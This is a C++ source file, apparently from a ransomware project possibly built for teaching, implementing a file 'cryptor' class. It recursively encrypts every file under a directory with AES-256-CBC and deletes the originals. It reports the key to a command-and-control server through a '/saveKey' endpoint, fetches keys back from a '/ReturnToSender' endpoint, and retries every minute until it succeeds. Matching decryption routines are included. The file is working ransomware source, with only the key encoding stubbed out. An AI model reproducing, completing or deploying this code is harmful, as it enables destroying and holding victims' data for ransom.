#include "cryptor.h"

#include <cpr/cpr.h>
#include <chrono>
#include <cstring>
#include <filesystem>
#include <fstream>
#include <iostream>
#include <thread>
#include <string>

#include <openssl/evp.h>
#include <openssl/rand.h>

#define BUFFER_SIZE 1024
#define INFO    "[i] "
#define ERROR   "[☓] "
#define OK      "[✓] "
#define INPUT   "[/] "


// CST & DST

AES256CBC::AES256CBC() {
    evp_aes256cbc = EVP_CIPHER_fetch(NULL, "AES-256-CBC", NULL);
    key = new unsigned char[keySize_]();
}

AES256CBC::~AES256CBC() {
    EVP_CIPHER_free(evp_aes256cbc);
    delete[] key;
}


// Methods

bool AES256CBC::decryptFile(std::filesystem::path path) {
    cout() << "[#] Decrypting " << path << "...\n";
    if (path.extension() != extension_) {
        cout() << " └─ Nothing to do.\n";
        return false;
    }
    std::ifstream fin(path, std::ios::binary);
    std::ofstream fout(path.replace_extension(), std::ios::binary);
    // IMPORTANT: path does not have the extension from this point!
    if (!fin or !fout) {
        cerr() << " └─" << ERROR << "Error opening file.\n";
        return false;
    }
     
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    unsigned char iv[keySize_];
    fin.readsome((char*)iv, keySize_);
    if ( !ctx or !EVP_DecryptInit_ex(ctx, evp_aes256cbc, NULL, key, iv) ) {
        cerr() << " └─" << ERROR << "Error initializing encryption.\n";
        EVP_CIPHER_CTX_free(ctx);
        return false;
    }

    unsigned char buffer[BUFFER_SIZE];
    unsigned char decryptedBuffer[BUFFER_SIZE];
    int bytesRead, decryptedLen;

    while ((bytesRead = fin.readsome((char*)buffer, BUFFER_SIZE)) > 0) {
        EVP_DecryptUpdate(ctx, decryptedBuffer, &decryptedLen, buffer, bytesRead);
        fout.write((char*)decryptedBuffer, decryptedLen);
    }

    EVP_DecryptFinal_ex(ctx, decryptedBuffer, &decryptedLen);
    fout.write((char*)decryptedBuffer, decryptedLen);

    EVP_CIPHER_CTX_free(ctx);
    path += extension_;  // TODO: consider a way to make it look less stupid
                        // Maybe also unify the handling with the encryption
                        // function (also make it use one "path" and have it
                        // appended)

    fin.close();
    fout.close();
    std::filesystem::remove(path);
    cout() << " └─" << OK << "Done.\n";
    return true;
}

void AES256CBC::decryptRecursively(const std::filesystem::path& path) {
    //if (!key)  // Do we need this architecture-wise?
    if (!std::filesystem::is_directory(path)) {
        std::cerr << ERROR << "Not a directory: " << path << "\n";
        return;
    }
    if (!*key) {
        cerr() << ERROR << "Key is not present.\n";
        return;
    }
    for (const auto &entry : std::filesystem::recursive_directory_iterator(path)) {
        std::filesystem::path filename = entry.path();
        if (filename.extension() == extension_ and std::filesystem::is_regular_file(entry))
            decryptFile(filename);
    }
}

bool AES256CBC::encryptFile(const std::filesystem::path& pathIn) {
    cout() << "[#] Encrypting " << pathIn << "...\n";
    std::string pathOut = pathIn.string() + extension_;
    std::ifstream fin(pathIn, std::ios::binary);
    std::ofstream fout(pathOut, std::ios::binary);
    if (!fin or !fout) {
        cerr() << " └─" << ERROR << "Error opening file.\n";
        return false;
    }
    
    EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
    unsigned char iv[keySize_];
    RAND_bytes(iv, keySize_);
    if ( !ctx or !(*iv) or !EVP_EncryptInit_ex(ctx, evp_aes256cbc, NULL, key, iv) ) {
        cerr() << " └─" << ERROR << "Error initializing encryption.\n";
        EVP_CIPHER_CTX_free(ctx);
        return false;
    }
    fout.write((char*)iv, keySize_);

    unsigned char buffer[BUFFER_SIZE];
    unsigned char encryptedBuffer[BUFFER_SIZE];
    int bytesRead, encryptedLen;

    while ((bytesRead = fin.readsome((char*)buffer, BUFFER_SIZE)) > 0) {
        EVP_EncryptUpdate(ctx, encryptedBuffer, &encryptedLen, buffer, bytesRead);
        fout.write((char*)encryptedBuffer, encryptedLen);
    }

    EVP_EncryptFinal_ex(ctx, encryptedBuffer, &encryptedLen);
    fout.write((char*)encryptedBuffer, encryptedLen);

    fin.close();
    fout.close();
    std::filesystem::remove(pathIn);
    EVP_CIPHER_CTX_free(ctx);
    cout() << " └─" << OK << "Done.\n";
    return true;
}

void AES256CBC::encryptRecursively(const std::filesystem::path& path) {
    if (!std::filesystem::is_directory(path)) {
        cerr() << ERROR << "Not a directory: " << path << "\n";
        return;
    }
    if (!*key) {
        cerr() << ERROR << "Key is not present.\n";
        return;
    }
    for (const auto &entry : std::filesystem::recursive_directory_iterator(path)) {
        std::filesystem::path filename = entry.path();
        if (filename.extension() != extension_ and std::filesystem::is_regular_file(entry))
            encryptFile(filename);
    }
}

void AES256CBC::generateKey() {
    RAND_bytes(key, keySize_);
    cout() << INFO << "Generated key.\n";
}

void AES256CBC::keyFromC2(const std::string& id) {
    using namespace std::chrono_literals; // s, ns, ms, etc. | Altho I don't like this
    while (!*key) {
        cpr::Response r = 
            cpr::Get(C2Addr + "/ReturnToSender",cpr::Body{"UniqID="+id});
        if (r.status_code != 200) {
            std::this_thread::sleep_for(60s); // Would rather have smth like 60std::chrono_literals::s
            continue;
        }
        if (r.text.empty())
            generateKey();
        else
            std::memcpy(key, r.text.data(), keySize_*sizeof(char));
    }
    cout() << INFO << "Fetched key from C2: " << key << std::endl;
}

void AES256CBC::keyFromFile() {
    std::string keyPath;
    std::cout << INPUT << "Enter a path where to read the key from (default=./key.hackademic): ";
    getline(std::cin, keyPath);
    if (keyPath == "")
        keyPath = "./key.hackademic";
    std::ifstream fin(keyPath, std::ios::binary);
    if (!fin)
        cerr() << " └─" << ERROR << "Error opening file.\n";
    else {
        fin.readsome((char*)key, keySize_);
        cout() << INFO << "Read the key from:  " << keyPath << ".\n";
    }
}

void AES256CBC::keyToC2(const std::string& id) {
    std::string encodedKey = "123"; // = b64EncodeKey();
    auto postKey = [&]() {
        return cpr::Post(C2Addr + "/saveKey",
                         cpr::Body{"Key=" + encodedKey + "&UniqID=" + id}
                        );
    };
    using namespace std::chrono_literals;
    while ( postKey().status_code != 200 ) {
        std::this_thread::sleep_for(60s);
    }
}

void AES256CBC::keyToFile() {
    std::string keyPath;
    std::cout << INPUT << "Enter a path where to write the key to (default=./key.hackademic): ";
    getline(std::cin, keyPath);
    if (keyPath == "")
        keyPath = "./key.hackademic";
    std::ofstream fout(keyPath, std::ios::binary);
    if (!fout)
        cerr() << " └─" << ERROR << "Error opening file.\n";
    else {
        fout.write((char*)key, keySize_);
        cout() << INFO << "Wrote the key to:  " << keyPath << ".\n";
    }
}

